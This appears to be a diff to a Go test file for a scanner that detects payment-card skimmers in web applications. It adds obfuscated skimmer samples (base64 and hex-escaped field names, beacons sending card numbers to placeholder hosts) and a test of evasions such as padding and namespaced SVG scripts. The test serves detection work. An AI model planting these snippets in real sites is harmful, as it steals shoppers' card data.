@@ -2,6 +2,7 @@ package web
 
 import (
 	"context"
+	"fmt"
 	"os"
 	"path/filepath"
 	"slices"
@@ -22,10 +23,12 @@ func TestSkimmerSignals(t *testing.T) {
 		"harvest":      {`document.querySelectorAll("input").forEach(function(i){if(/cvv|card/.test(i.name))d[i.name]=i.value});navigator.sendBeacon(atob("Ly9leC5leGFtcGxl"),JSON.stringify(d))`, true},
 		"bundle":       {`$(document).find("form").each(function(){var f=new FormData(this)});var i=new Image();i.src="https://cdn.example.org/x.gif";var g=new Function("return this")()`, false},
 		// Built here so that no secret scanner takes the test for a leaked key.
-		"secret key":   {`var k = "` + "sk_" + "live_" + strings.Repeat("Ab3", 8) + `";`, true},
-		"payment form": {`define(['jquery'],function($){return {getData:function(){return {cc_number:$('#cc_number').val(),cc_cid:$('#cc_cid').val()}}, save:function(d){return $.ajax({url:'/rest/V1/carts/mine/payment-information',type:'POST',data:d})}}})`, false},
-		"analytics":    {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
-		"jquery-ish":   {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
+		"secret key":    {`var k = "` + "sk_" + "live_" + strings.Repeat("Ab3", 8) + `";`, true},
+		"payment form":  {`define(['jquery'],function($){return {getData:function(){return {cc_number:$('#cc_number').val(),cc_cid:$('#cc_cid').val()}}, save:function(d){return $.ajax({url:'/rest/V1/carts/mine/payment-information',type:'POST',data:d})}}})`, false},
+		"analytics":     {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
+		"atob names":    {`var f=document.querySelector(atob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd"));f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
+		"escaped names": {`var n="\x63\x61\x72\x64\x5f\x6e\x75\x6d\x62\x65\x72";$("#"+n).on("blur",function(){navigator.sendBeacon("https://x.example.net/c",this.value)})`, true},
+		"jquery-ish":    {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
 			t.Errorf("%s: %v (%v), want %v", name, got, skimmerSignals([]byte(c.src)), c.want)
@@ -104,4 +107,58 @@ func TestSkimmerOnCleanCorpus(t *testing.T) {
 		t.Fatal(err)
 	}
 	t.Logf("%d files", files)
+}
+
+// Many files changed at once leave out the packages updated as a whole and generated bundles,
+// not a skimmer in a file changed on its own; decoys of other kinds do not count; a skimmer
+// padded past the size read at once is still seen; an SVG script under any namespace prefix runs.
+func TestSkimmerEvasions(t *testing.T) {
+	tr := newTree(t)
+	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6';")
+	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){})")
+	tr.file("var/www/blog/wp-content/themes/shop/big.js", "jQuery(function(){})")
+	c := &Collector{StateDir: t.TempDir()}
+	scan := func() (AppReport, []string) {
+		t.Helper()
+		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := c.Commit(); err != nil {
+			t.Fatal(err)
+		}
+		res := out.(Result)
+		for _, a := range res.Apps {
+			if a.Path == "/var/www/blog" {
+				return a, res.Issues
+			}
+		}
+		t.Fatal("application not found")
+		return AppReport{}, nil
+	}
+	skimmer := `document.addEventListener("change",function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src="https://img.example.com/i.gif?c="+v.value}});`
+	scan()
+	for i := range 60 {
+		tr.file(fmt.Sprintf("var/www/blog/wp-content/notes/%02d.txt", i), "x")
+		tr.file(fmt.Sprintf("var/www/blog/wp-content/plugins/builder/assets/%02d.js", i), skimmer)
+	}
+	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){});\n"+skimmer)
+	tr.file("var/www/blog/wp-content/themes/shop/big.js", `var v=document.querySelector('[name="payment[cc_number]"]');/*`+
+		strings.Repeat("x", maxInMemory+skimmerChunk)+`*/new Image().src="https://img.example.com/i.gif?c="+v.value;`)
+	tr.file("var/www/blog/wp-content/uploads/x.svg", `<svg xmlns="http://www.w3.org/2000/svg"><x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script></svg>`)
+	app, issues := scan()
+	var got []string
+	for _, f := range app.Findings {
+		if f.Kind == KindSkimmer || f.Kind == KindActiveSVG {
+			got = append(got, f.Kind+" "+strings.TrimPrefix(f.Path, "/var/www/blog/"))
+		}
+	}
+	slices.Sort(got)
+	want := []string{"active_svg_in_upload_dir wp-content/uploads/x.svg", "payment_skimmer wp-content/themes/shop/big.js", "payment_skimmer wp-content/themes/shop/checkout.js"}
+	if !slices.Equal(got, want) {
+		t.Errorf("findings:\n got  %q\n want %q", got, want)
+	}
+	if !slices.ContainsFunc(issues, func(i string) bool { return strings.Contains(i, "wp-content/plugins/builder") }) {
+		t.Errorf("the package updated as a whole is not named: %q", issues)
+	}
 }
